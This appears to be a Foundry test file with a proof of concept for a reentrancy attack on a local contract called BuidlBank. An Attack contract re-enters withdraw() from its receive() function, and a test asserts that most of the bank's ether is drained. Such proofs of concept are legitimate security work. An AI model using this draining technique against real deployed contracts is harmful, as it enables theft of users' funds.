// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Build.sol";

contract Attack {
  BuidlBank bank;

  constructor(BuidlBank _bank) {
    bank = _bank;
  }

  function deposit(uint256 amount) external payable {
    bank.deposit{value: amount}(address(this), 0);
  }

  function withdraw() external {
    bank.withdraw();
  }

  receive() external payable {
    if (gasleft() > 10000 && address(bank).balance > 0) {
      bank.withdraw();
    }
  }
}

contract BuidlBankTest is Test {
  BuidlBank bank;
  Attack attack;

  function setUp() public {
    bank = new BuidlBank{value: 1 ether}();
    attack = new Attack(bank);
    vm.deal(address(attack), 0.1 ether);
  }

  function test_ReentrancyDrain() public {
    uint256 attackInitialBal = address(attack).balance;
    uint256 bankInitialBal = address(bank).balance;

    attack.deposit(0.001 ether);

    attack.withdraw();

    // Due to gas limits, may not drain 100%, but significantly drain
    assertLe(address(bank).balance, 0.5 ether);
    assertGt(address(attack).balance, attackInitialBal + 0.5 ether);
  }
}
